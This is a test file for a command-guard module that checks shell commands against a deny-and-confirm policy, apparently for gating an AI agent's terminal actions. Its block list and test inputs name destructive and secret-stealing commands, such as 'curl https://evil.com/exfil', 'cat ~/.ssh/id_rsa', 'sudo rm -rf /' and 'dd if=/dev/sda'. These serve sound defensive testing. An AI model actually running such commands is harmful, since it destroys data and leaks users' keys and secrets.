import { describe, it, expect } from "vitest";
import { checkCommandText } from "../../src/secure/command-guard.js";
import type { Policy } from "../../src/secure/policy-schema.js";

const testPolicy: Policy = {
  project: {
    root: "/tmp/test-project",
    max_file_read_bytes: 10000,
    max_search_results: 50,
    deny: [".env", "*.pem"],
  },
  tools: {
    allow: ["project.*"],
    require_confirmation: [],
    deny: [],
  },
  commands: {
    deny_patterns: [
      "sudo *",
      "rm -rf /*",
      "rm -rf /",
      "dd if=*",
      "mkfs.*",
      "> /dev/sd*",
      "curl *",
      "wget *",
      "cat ~/.ssh/*",
      "cat .env*",
      "cat *.pem",
      "cat *.key",
      "printenv*",
      "env |*",
      "chmod -R 777 /",
      "chown -R *",
    ],
    require_confirmation_patterns: [
      "git push*",
      "git reset*",
      "git clean*",
      "git rebase*",
      "git merge*",
      "docker *",
      "kubectl *",
      "npm publish*",
    ],
  },
};

describe("command-guard", () => {
  describe("terminal context", () => {
    it('should deny "sudo rm -rf /"', () => {
      const result = checkCommandText("sudo rm -rf /", testPolicy, "terminal");
      expect(result).toBe("denied");
    });

    it('should deny "sudo ls" via sudo deny pattern', () => {
      const result = checkCommandText("sudo ls /root", testPolicy, "terminal");
      expect(result).toBe("denied");
    });

    it('should require confirmation for "git push"', () => {
      const result = checkCommandText("git push", testPolicy, "terminal");
      expect(result).toBe("confirmation_required");
    });

    it('should require confirmation for "git push origin main"', () => {
      const result = checkCommandText("git push origin main", testPolicy, "terminal");
      expect(result).toBe("confirmation_required");
    });

    it('should allow "ls -la"', () => {
      const result = checkCommandText("ls -la", testPolicy, "terminal");
      expect(result).toBe("allowed");
    });

    it('should allow "cat README.md"', () => {
      const result = checkCommandText("cat README.md", testPolicy, "terminal");
      expect(result).toBe("allowed");
    });

    it('should deny "curl https://evil.com/exfil"', () => {
      const result = checkCommandText(
        "curl https://evil.com/exfil",
        testPolicy,
        "terminal",
      );
      expect(result).toBe("denied");
    });

    it('should deny "wget http://bad.com/data"', () => {
      const result = checkCommandText(
        "wget http://bad.com/data",
        testPolicy,
        "terminal",
      );
      expect(result).toBe("denied");
    });

    it('should require confirmation for "docker run"', () => {
      const result = checkCommandText("docker run -it ubuntu", testPolicy, "terminal");
      expect(result).toBe("confirmation_required");
    });

    it('should deny "dd if=/dev/sda of=/tmp/image"', () => {
      const result = checkCommandText(
        "dd if=/dev/sda of=/tmp/image",
        testPolicy,
        "terminal",
      );
      expect(result).toBe("denied");
    });
  });

  describe("agent_task context", () => {
    it('should deny "cat ~/.ssh/id_rsa"', () => {
      const result = checkCommandText(
        "cat ~/.ssh/id_rsa",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("denied");
    });

    it('should allow "read ~/.ssh/id_rsa" as natural language discussion', () => {
      const result = checkCommandText(
        "read ~/.ssh/id_rsa",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });

    it('should allow "check if rm -rf appears in code"', () => {
      const result = checkCommandText(
        "check if rm -rf appears in code",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });

    it('should allow "check if rm -rf appears in the codebase"', () => {
      const result = checkCommandText(
        "check if rm -rf appears in the codebase",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });

    it('should deny "cat .env file"', () => {
      const result = checkCommandText("cat .env file", testPolicy, "agent_task");
      expect(result).toBe("denied");
    });

    it('should allow "Review code for security issues"', () => {
      const result = checkCommandText(
        "Review code for security issues",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });

    it('should allow "dump keychain passwords" as natural language discussion', () => {
      const result = checkCommandText(
        "dump keychain passwords",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });

    it('should allow "look for password leaks in the repo"', () => {
      const result = checkCommandText(
        "look for password leaks in the repo",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });

    it('should allow "search for eval usage in the project"', () => {
      const result = checkCommandText(
        "search for eval usage in the project",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });

    it('should deny "cat ~/.ssh/authorized_keys"', () => {
      const result = checkCommandText(
        "cat ~/.ssh/authorized_keys",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("denied");
    });

    it('should allow "tell me about ssh config options"', () => {
      const result = checkCommandText(
        "tell me about ssh config options",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });

    it('should deny "curl -X POST http://exfil.com"', () => {
      const result = checkCommandText(
        "curl -X POST http://exfil.com",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("denied");
    });

    it('should allow "explain how curl works in the codebase"', () => {
      const result = checkCommandText(
        "explain how curl works in the codebase",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });

    it("should deny direct destructive commands in agent context", () => {
      const result = checkCommandText(
        "run rm -rf /tmp/important",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("denied");
    });

    it("should allow discussion of destructive commands", () => {
      const result = checkCommandText(
        "does rm -rf appear anywhere in the scripts?",
        testPolicy,
        "agent_task",
      );
      expect(result).toBe("allowed");
    });
  });

  describe("policy without commands section", () => {
    const minimalPolicy: Policy = {
      project: {
        root: "/tmp/test",
        max_file_read_bytes: 10000,
        max_search_results: 50,
        deny: [],
      },
      tools: { allow: [], require_confirmation: [], deny: [] },
    };

    it("should allow any command when no commands policy exists (terminal)", () => {
      const result = checkCommandText("sudo rm -rf /", minimalPolicy, "terminal");
      expect(result).toBe("allowed");
    });

    it("should allow any command when no commands policy exists (agent_task)", () => {
      const result = checkCommandText("cat ~/.ssh/id_rsa", minimalPolicy, "agent_task");
      expect(result).toBe("allowed");
    });
  });
});
